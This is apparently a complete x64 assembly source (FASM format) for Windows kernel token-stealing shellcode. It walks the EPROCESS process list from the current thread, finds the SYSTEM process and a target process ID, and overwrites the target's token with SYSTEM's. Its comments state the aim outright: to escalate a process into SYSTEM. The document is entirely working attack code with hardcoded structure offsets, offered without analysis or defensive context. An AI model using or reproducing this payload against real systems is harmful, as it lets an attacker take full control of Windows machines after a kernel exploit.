format PE64 console
entry start

section '.text' code readable executable
    start:
        ; rcx == pid of target process to escalate into SYSTEM
        push rbx
        mov ebx, 188h
        mov rdx, [gs:rbx]      ; _KTHREAD
        mov rdx, [rdx + 220h]  ; _KPROCESS (_EPROCESS)
        call find_target
        mov rbx, rax  ; rbx now stores _EPROCESS of target process
        mov ecx, 4
        mov rdx, rbx
        call find_target  ; rax now stores _EPROCESS of SYSTEM process
        mov rax, [rax + 360h]  ; Token of SYSTEM
        mov [rbx + 360h], rax   ; Token overwritten!
        pop rbx
        ret
    find_target:
        ; rcx == pid of process to escalate into SYSTEM
        ; rdx == _EPROCESS of some process
        find_loop:
            mov rdx, [rdx + 2f0h]  ; ActiveProcessLinks.Flink
            sub rdx, 2f0h
            cmp [rdx + 2e8h], rcx  ; UniqueProcessId
            jne find_loop
        mov rax, rdx
        ret